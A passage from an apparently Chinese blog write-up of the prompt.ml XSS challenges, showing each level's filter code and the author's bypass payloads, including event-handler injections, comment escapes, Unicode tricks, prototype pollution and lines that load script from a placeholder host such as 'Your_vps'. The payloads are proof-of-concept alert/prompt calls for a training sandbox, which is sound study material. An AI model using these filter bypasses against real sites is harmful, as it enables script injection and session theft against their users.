class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiHezR.png" alt="KiHezR.png"></p>
<p>通过正则吃掉完整的标签，所以我们需要不通过完整标签就能xss的标签</p>
<p>也就是不能用闭合标签了，需要找一些自闭和标签进行xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br><span class="line">&lt;body onload&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>以上三种都可以进行xss</p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(/[=(]/g, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤符号如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[,],&#x3D;,(</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KiP89P.png" alt="KiP89P.png"></p>
<p>很有趣的XSS bypass</p>
<p><a href="https://blog.csdn.net/weixin_30408165/article/details/99649981" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30408165/article/details/99649981</a></p>
<p>首先`字符是可以把包裹住的字符串当成字符，同时把unicode转化为正常字符，即可成功alert。</p>
<p>setTimeout函数</p>
<p><img src="https://s2.ax1x.com/2019/10/16/Kin3ZV.png" alt="Kin3ZV.png"></p>
<p>看网上的其他wp大都是通过&lt;svg&gt;去解析html编码，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;&#x2F;script&gt;</span><br><span class="line">&#x2F;&#x2F;另一种payload</span><br><span class="line">&lt;script&gt;eval.call&#96;$&#123;&#39;prompt\x281)&#39;&#125;&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(/-&gt;/g, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>html5的注释标签不仅可以使用<code>--&gt;</code>，还可以使用<code>--!&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;svg&#x2F;onload&#x3D;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (/^(?:https?:)?\/\/prompt\.ml\<span class="comment">//i.test(decodeURIComponent(input))) &#123;</span></span><br><span class="line">        <span class="keyword">var</span> script = document.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@Your_vps</span><br></pre></td></tr></table></figure>

<p>利用知识为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1@www.baidu.com&#x2F;</span><br></pre></td></tr></table></figure>

<p>实际上访问的是<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p>不过这道题匹配的是<a href="http://prompt.ml/，后面的这个/很麻烦，我们如果用http://127.0.0.1/@www.baidu.com/是无法访问到百度的，这个/必须要去掉，这里decode函数帮了我们这个忙，通过" target="_blank" rel="noopener">http://prompt.ml/，后面的这个/很麻烦，我们如果用http://127.0.0.1/@www.baidu.com/是无法访问到百度的，这个/必须要去掉，这里decode函数帮了我们这个忙，通过</a></p>
<p><a href="http://prompt.ml%2f@Your_vps" target="_blank" rel="noopener">http://prompt.ml%2f@Your_vps</a> 既可以bypass正则，又可以规避掉/这个字符。</p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFrcPU.png" alt="KFrcPU.png"></p>
<p>这题过滤掉了onfocus，Onxxx=之类的形式，对于onxxx=的bypass我们可以使用换行来Bypass,因为属性描述不在同一行并不影响解析，如果没过滤onfocus，我们可以通过如下payload绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了情况下可以通过覆盖type，进行onerror触发xss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type&#x3D;&quot;image&quot; src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p>即可触发xss</p>
<p>看大佬的博客学到了在IE下可以通过onresize触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onresize</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = JSON.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = document.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i in formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(document.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑就是自动通过传进去参数填写表单，并且submit，不过在submit前需要对action属性进行一下检测</p>
<p>这个trick挺有意思的，我之前没看到过。</p>
<p>这里在action的地方可以通过javascript伪协议来触发xss，但是这里有一个对action标签的检测，不过这里允许我们自己添加，我们在后面添加一个action就可以bypass这个正则了</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFgJ1O.png" alt="KFgJ1O.png"></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限定了12个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;      &#x2F;* *&#x2F;     &lt;!-- --&gt;    &lt;!-- --!&gt;</span><br></pre></td></tr></table></figure>

<p>一般用于Bypass和过滤的注释符</p>
<p>还行，挺简单的bypass,用js的注释符多行注释一下就行</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt(&#x2F;*#*&#x2F;1)&#x2F;*#*&#x2F;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学到了，原来在Js中不光有\r\n这种换行符，还有神奇的unicode字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u2028prompt(1)\u2028--&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/10/16/KFT92R.png" alt="KFT92R.png"></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看过code-breaking的nodechr，也就会了，不过还要注意的是js对大小写是敏感的，所以必须引入外部js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=<span class="string">"http://xxxtest.js"</span>&gt;&lt;<span class="regexp">/ſcript&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题出的就很没意思了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prom&#39;pt(1)</span><br></pre></td></tr></table></figure>

<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))instanceof"</span></span><br></pre></td></tr></table></figure>

<p>一张图看懂，即使报错，也能xss</p>
<p><img src="https://s2.ax1x.com/2019/10/17/KEhYaF.png" alt="KEhYaF.png"></p>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来想着用fromCharCode来着，后面发现逗号被url编码了，所以可以用下面的这个数字转换进行来代替</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval((630038579).toString(30))(1)</span><br></pre></td></tr></table></figure>

<p>另一种比较有意思的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for((i)in(self))eval(i)(1)</span><br></pre></td></tr></table></figure>

<p>通过循环拿到self里面的函数，来进行prompt</p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>典型的原型链污染，不过后面的正则操作有丶意思，之前没了解过</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&#123;&#125;,&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#96;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如下</p>
<p>直接粘了先知例子了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"test"</span>)</span><br><span class="line"><span class="string">"11test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$`test"</span>)</span><br><span class="line"><span class="string">"1111test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$'test"</span>)</span><br><span class="line"><span class="string">"1123344test23344"</span></span><br><span class="line">&gt;<span class="string">'11223344'</span>.replace(<span class="string">'2'</span>,<span class="string">"$&amp;test"</span>)</span><br><span class="line"><span class="string">"112test23344"</span></span><br></pre></td></tr></table></figure>

<p>从上面例子易得此payload</p>
<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME&#x2F;SRC&#x3D;&quot;x:text&#x2F;html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJP</span><br></pre></td></tr></table></figure>

<p>官方payload，不过测试失败。</p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p 